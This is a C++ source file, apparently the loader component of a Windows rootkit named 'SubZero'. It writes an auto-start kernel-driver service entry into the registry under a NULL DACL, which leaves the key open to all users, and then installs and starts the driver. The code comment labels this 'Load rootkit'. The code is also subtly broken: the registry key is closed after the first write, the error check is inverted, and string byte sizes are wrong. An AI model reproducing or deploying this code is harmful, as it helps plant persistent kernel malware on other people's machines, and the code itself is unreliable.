#include "pch.h"
#include "ServiceManager.h"

constexpr const DWORD regType = 1;
constexpr const DWORD regStart = 2;
constexpr const DWORD regErrorControl = 0;
constexpr const WCHAR* regDescription = L"X";
constexpr const WCHAR* driverName = L"subzero";
constexpr const WCHAR* driverPath = L"C:\\Users\\Daniel\\Desktop\\Drivers\\SubZero\\Debug\\SubZeroDriver.sys";

HKEY CreateRegistryKey(HKEY hKeyRoot, LPCTSTR pszSubKey)
{
	HKEY hKey;
	DWORD dwFunc;
	LONG  lRet;

	//------------------------------------------------------------------------------

	SECURITY_DESCRIPTOR SD;
	SECURITY_ATTRIBUTES SA;

	if (!InitializeSecurityDescriptor(&SD, SECURITY_DESCRIPTOR_REVISION))
		return NULL;

	if (!SetSecurityDescriptorDacl(&SD, true, 0, false))
		return NULL;

	SA.nLength = sizeof(SA);
	SA.lpSecurityDescriptor = &SD;
	SA.bInheritHandle = false;

	//------------------------------------------------------------------------------

	lRet = RegCreateKeyEx(
		hKeyRoot,
		pszSubKey,
		0,
		(LPTSTR)NULL,
		REG_OPTION_NON_VOLATILE,
		KEY_WRITE,
		&SA,
		&hKey,
		&dwFunc
	);
	
	if (lRet) return NULL;
	return hKey;
	//return lRet ? hKey : NULL;
}

bool SetRegistryValue(HKEY hKey, LPCTSTR pszValue, DWORD dwType, PVOID pData, DWORD dwSize)
{
	LONG lRes = 0;

	lRes = RegSetValueEx(hKey, pszValue, 0, dwType, (unsigned char*)pData, dwSize);

	RegCloseKey(hKey);

	if (lRes != ERROR_SUCCESS)
	{
		SetLastError(lRes);
		return false;
	}

	return true;
}



//int WINAPI wWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, PWSTR pCmdLine, int nCmdShow) {
int wmain(int argc, wchar_t* argv[]) {
	
	HKEY hKey;

	hKey = CreateRegistryKey(HKEY_LOCAL_MACHINE, L"SYSTEM\\CurrentControlSet\\Services\\subzero");

	if (!hKey) {
		std::wcout << "[-] Error creating registry key " << GetLastError() << std::endl;
		return 0;
	}

	if (!(SetRegistryValue(hKey, L"Type", REG_DWORD, (PVOID)&regType, sizeof(regType)) ||
		SetRegistryValue(hKey, L"Start", REG_DWORD, (PVOID)&regStart, sizeof(regStart)) || 
		SetRegistryValue(hKey, L"ErrorControl", REG_DWORD, (PVOID)&regErrorControl, sizeof(regErrorControl)) ||
		SetRegistryValue(hKey, L"ImagePath", REG_EXPAND_SZ, (PVOID)driverPath, wcslen(driverPath)) ||
		SetRegistryValue(hKey, L"DisplayName", REG_SZ, (PVOID)driverName, wcslen(driverName)) ||
		SetRegistryValue(hKey, L"Description", REG_SZ, (PVOID)regDescription, wcslen(regDescription))))
	{
		std::wcout << "[-] Error setting registry values" << std::endl;
		return 0;
	}

	bool isInstalled = false;
	bool isStarted = false;

	// Load rootkit
	ServiceManager scm(driverName, driverPath, SERVICE_KERNEL_DRIVER);
	do {
		isInstalled = scm.Install();
		if (!isInstalled) {
			std::wcout << "[+] Error installing the service" << std::endl;
			break;
		}

		std::wcout << "[+] Service installed" << std::endl;

		isStarted = scm.Start();
		if (!isStarted) {
			std::wcout << "[+] Error starting the service" << std::endl;
			break;
		}

		std::wcout << "[+] Service started" << std::endl;

	} while (false);

	return 1;
}